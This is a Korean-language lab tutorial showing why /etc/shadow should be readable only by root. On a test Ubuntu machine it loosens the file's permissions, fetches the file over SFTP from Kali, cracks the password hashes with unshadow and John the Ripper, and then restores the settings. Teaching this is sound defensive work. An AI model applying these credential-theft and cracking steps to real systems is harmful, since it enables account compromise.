## /etc/shadow 파일 소유자 및 권한 설정

왜 `root` 외의 일반 사용자가 `/etc/shadow` 파일 내용을 볼 수 없도록 설정(접근 권한이 `400` 이하)해야 하는지 알아봅시다.

### 실습 1 : 공격자가 원격에서 일반 사용자로 접속하여 `/etc/shadow` 파일 탈취 및 패스워드 크래킹
1. [우분투] `sudo` 명령을 사용할 수 없는 일반 사용자 `aaa` 생성
```
cju@wooam:~$ sudo adduser aaa
```

2. [우분투] 누구나 `/etc/shadow` 파일을 볼 수 있도록 변경
```
cju@wooam:~$ sudo chmod 444 /etc/shadow
```

3. [우분투] 원격 접속을 위해 OpenSSH 서버 설치
```
cju@wooam:~$ sudo apt install openssh-server
```

4. [우분투] IP 주소 확인
```
cju@wooam:~$ ip a
```

5. [칼리] 앞에서 확인한 IP 주소로 접속
```
$ sftp aaa@192.168.xxx.yyy
aaa@192.168.202.xxx's password: 
Connected to 192.168.202.xxx.
```

6. [칼리] 우분투의 `/etc/passwd` 파일 다운로드
```
sftp> get /etc/passwd
Fetching /etc/passwd to passwd
passwd                                     100% 2967     2.2MB/s   00:00    
```

7. [칼리] 우분투의 `/etc/shadow` 파일 다운로드
```
sftp> get /etc/shadow
Fetching /etc/shadow to shadow
shadow                                     100% 1585     1.1MB/s   00:00    
```

8. [칼리] SFTP 접속 종료
```
sftp> bye
```

9. [칼리] 다운로드한 2개의 파일을 하나로 통합
```
$ unshadow passwd shadow > ubuntu
```

10. [칼리] John the Ripper로 패스워드 크래킹 시작
```
$ john --format=crypt ubuntu
```

11. [칼리] 패스워드가 보인다!
```
1111             (cju)     
1111             (aaa)     
```

> (참고) 크래킹에 성공한 해시 값과 패스워드는 `.john/john.pot`에 저장됨

### 복구
1. [우분투] 다른 사용자가 `/etc/shadow` 파일 내용을 볼 수 없도록 권한 변경
```
cju@wooam:~$ sudo chmod 400 /etc/shadow
```

2. [우분투] (필요시) 생성한 계정 삭제
```
cju@wooam:~$ sudo deluser --remove-all-files aaa
```

3. [우분투] (필요시) OpenSSH 서버 제거
```
cju@wooam:~$ sudo apt remove openssh-server
```